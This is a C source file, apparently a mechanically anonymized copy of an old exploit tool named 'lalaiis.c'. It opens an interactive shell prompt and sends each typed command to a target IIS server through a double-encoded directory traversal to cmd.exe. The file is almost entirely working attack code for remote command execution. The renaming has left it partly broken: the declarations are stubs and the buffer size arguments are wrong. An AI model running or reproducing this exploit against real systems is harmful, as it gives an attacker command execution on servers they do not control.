
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int s_addr ;
typedef int request ;
typedef int host ;
typedef int command ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 int * FUNC_4 (char*,int,int ) ;
 int FUNC_5 (int ,char*) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,char*,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*,...) ;
 scalar_t__ FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,char*,int,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*) ;
 int FUNC_16 (char*,char*,int) ;
 int FUNC_17 (char*,char*,int) ;
 int FUNC_18 () ;

int FUNC_19(int VAR_6, char **VAR_7)
{
 int VAR_8, VAR_9, VAR_10, VAR_11 ;
 int VAR_12=80;
 int VAR_13=80;
 char VAR_14[1];
 char VAR_15[512]="";
 char VAR_16[1024]="";
 char VAR_17[8192]="GET /";
 struct hostent *VAR_18;
 struct sockaddr_in VAR_19;

 FUNC_10(":: lalaiis.c exploit. Coded by MovAX\n");

 if (VAR_6 < 3)
    FUNC_18();

 FUNC_17(VAR_15, VAR_7[1], sizeof(VAR_15));

 if(!FUNC_14(VAR_15, ""))
 {
  FUNC_5(VAR_4, "put a damn server\n");
  FUNC_18();
 }

 FUNC_10("\n:: Destination host > %s:%d\n", VAR_15, VAR_13);


 if((VAR_18=FUNC_6(VAR_15)) == ((void*)0))
 {
   FUNC_5(VAR_4, "put a damn VALID server\n");
  FUNC_18();
 }

for (;;)
{
    VAR_16[0]=0;
    FUNC_10("\nlala_shell> ");
    if(FUNC_4(VAR_16, sizeof(VAR_16), VAR_5) == ((void*)0))
       FUNC_9("gets");
    VAR_16[FUNC_15(VAR_16)-1]='\0';
    if(!FUNC_14("logout", VAR_16))
       FUNC_3(-1);

   for(VAR_8=0;VAR_8<FUNC_15(VAR_16);VAR_8++)
   {if(VAR_16[VAR_8]==' ')
     VAR_16[VAR_8]='+';
   }

  FUNC_17(VAR_17, "GET /", sizeof(VAR_17));
         FUNC_16(VAR_17, VAR_7[2], sizeof(request) - strlen(request) - 1);
         FUNC_16(VAR_17, "/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+", sizeof(request) - strlen(request) - 1);
   FUNC_16(VAR_17, VAR_16, sizeof(request) - strlen(request) - 1);
  FUNC_16(VAR_17, " HTTP/1.1\n", sizeof(request) - strlen(request) - 1);
  FUNC_16(VAR_17, "host:" ,sizeof(request) - strlen(request) - 1);
  FUNC_16(VAR_17, VAR_7[1], sizeof(request) - strlen(request) - 1);
   FUNC_16(VAR_17, "\n\n", sizeof(request) - strlen(request) - 1);

  VAR_19.sin_family = VAR_0;
   VAR_19.sin_port = FUNC_7(VAR_13);
   FUNC_8((char *) &VAR_19.sin_addr, (char *) VAR_18->h_addr,
   sizeof(VAR_19.sin_addr));

   if((VAR_9=FUNC_13(VAR_2, VAR_3, VAR_1)) == -1)
   {
     FUNC_9("socket\n");
     FUNC_3(-1);
   }
   FUNC_0(VAR_11);
   VAR_10 = FUNC_2(VAR_9,(struct sockaddr *)&VAR_19,sizeof(VAR_19));
   FUNC_0(0);

   if(VAR_10==-1)
   {
     FUNC_9("connect");
     FUNC_3(-1);
     FUNC_1(VAR_9);
   }

   FUNC_12(VAR_9, VAR_17, FUNC_15(VAR_17), 0);
   while(FUNC_11(VAR_9,VAR_14,1, 0)>0)
   {
            FUNC_0(VAR_12);
     FUNC_10("%c", VAR_14[0]);
            FUNC_0(0);
   }
}
  FUNC_1(VAR_9);
  return 0;
}
